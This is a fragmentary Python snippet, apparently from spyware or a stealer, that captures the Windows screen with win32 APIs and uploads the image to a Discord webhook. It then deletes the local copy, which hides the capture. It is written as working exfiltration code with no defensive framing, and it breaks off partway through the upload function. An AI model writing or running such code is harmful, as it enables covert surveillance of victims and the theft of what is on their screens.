...
def screenshot():
    ...
    screenshotted = win32ui.CreateBitmap()
    screenshotted.CreateCompatibleBitmap(img_dc, width, height)
    mem_dc.SelectObject(screenshotted)
    mem_dc.BitBlt((0,0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
    screenshotted.SaveBitmapFile(mem_dc, f'Screenshot.png')
    file_path = f'screenshot.png'
    send_to_discord2(file_path)
    os.remove(file_path)
    mem_dc.DeleteDC()
    win32gui.DeleteObject(screenshotted.GetHandle())
...
def send_to_discord2(ss):
    with open(ss, 'rb') as img_file:
        url = "https://discord.com/api/webhooks/xxx"
        data = {"file": (ss, img_file, "image/png")}
